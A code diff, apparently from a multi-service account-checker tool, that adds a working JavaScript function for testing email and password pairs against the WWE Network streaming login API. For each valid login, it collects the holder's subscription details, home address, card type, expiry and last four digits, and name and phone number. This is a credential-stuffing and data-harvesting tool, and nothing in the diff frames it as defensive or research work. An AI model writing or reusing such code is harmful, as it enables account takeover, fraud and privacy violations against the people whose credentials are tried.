@@ -3,6 +3,142 @@ const cheerio = require('cheerio');
 var qs = require('qs');
 var FormData = require('form-data');
 
+
+let wweChecker = async (account) => {
+    var checkResult = {
+        validAccount: false,
+        accountLogin : {
+            email:account.login,
+            password : account.password
+        },
+        accountInfo:{}
+    };
+    if(validateEmail(account.login)){
+        var data = JSON.stringify({"id":account.login,"secret":account.password});
+        var config = {
+            method: 'post',
+            url: 'https://dce-frontoffice.imggaming.com/api/v2/login',
+            headers: {
+                'realm': 'dce.wwe',
+                'app': 'dice',
+                'if-none-match': '',
+                'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2',
+                'Content-Type': 'application/json'
+            },
+            data : data
+        };
+
+        const tokenObj = await axios(config)
+            .then(async function (response) {
+                var configLicences = {
+                    method: 'get',
+                    url: 'https://dce-frontoffice.imggaming.com/api/v2/licence',
+                    headers: {
+                        'Authorization': 'Bearer ' + response.data.authorisationToken,
+                        'realm': 'dce.wwe',
+                        "accept": "*/*",
+                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
+                        "app": "dice",
+                        "if-none-match": "",
+                        "accept-language": "en-US;q=1.0",
+                        'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2'
+                    }
+                };
+                var configProfile = {
+                    method: 'get',
+                    url: 'https://dce-frontoffice.imggaming.com/api/v2/user/profile',
+                    headers: {
+                        'Authorization': 'Bearer ' + response.data.authorisationToken,
+                        'realm': 'dce.wwe',
+                        "accept": "*/*",
+                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
+                        "app": "dice",
+                        "if-none-match": "",
+                        "accept-language": "en-US;q=1.0",
+                        'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2'
+                    }
+                };
+                var configPayment = {
+                    method: 'get',
+                    url: 'https://dce-frontoffice.imggaming.com/api/v2/customer/cards',
+                    headers: {
+                        'Authorization': 'Bearer ' + response.data.authorisationToken,
+                        'realm': 'dce.wwe',
+                        "accept": "*/*",
+                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
+                        "app": "dice",
+                        "if-none-match": "",
+                        "accept-language": "en-US;q=1.0",
+                        'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2'
+                    }
+                };
+                var configAddress = {
+                    method: 'get',
+                    url: 'https://dce-frontoffice.imggaming.com/api/v2/user/address',
+                    headers: {
+                        'Authorization': 'Bearer ' + response.data.authorisationToken,
+                        'realm': 'dce.wwe',
+                        "accept": "*/*",
+                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
+                        "app": "dice",
+                        "if-none-match": "",
+                        "accept-language": "en-US;q=1.0",
+                        'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2'
+                    }
+                };
+                checkResult.validAccount = true;
+                checkResult.accountInfo.licences = await axios(configLicences)
+                    .then(response =>{
+                        var licences = response.data[0];
+                        return {
+                            type:licences.licence.type,
+                             expiryDate : licences.licenceStatus.expiryTimestamp,
+                             status : licences.licenceStatus.status,
+                             autoRenewingStatus:licences.licenceStatus.autoRenewingStatus,
+                            contentDownload:licences.licence.contentDownload.permission
+                        }
+                    })
+                    .catch(error =>{ console.log(error)});
+
+                checkResult.accountInfo.address = await axios(configAddress)
+                    .then(response => (response.data[0]))
+                    .catch(error =>{ console.log(error)});
+
+
+                checkResult.accountInfo.payment = await axios(configPayment)
+                    .then(response => {
+                        var card = response.data.cards[response.data.cards.length - 1];
+                        return {
+                            cardExpiry : `${card.expiryMonth}/${card.expiryYear}`,
+                            cardType:card.cardType,
+                            last4Digits :card.last4Digits
+                        }
+                    })
+                    .catch(error =>{ console.log(error)});
+
+                checkResult.accountInfo.profile = await axios(configProfile)
+                    .then(response => {
+                        console.log(response.data);
+                        var profile = response.data.name;
+                        return {
+                            funllName : profile.fullName,
+                            phoneNumber:profile.phoneNumber
+                        }
+                    })
+                    .catch(error =>{ console.log(error)});
+
+            })
+            .catch(function (error) {
+                console.log(error);
+            });
+    }
+
+
+    return checkResult;
+};
+
+
+
 let spotifyChecker = async (account)=>{
     var checkResult = {
         validAccount: false,
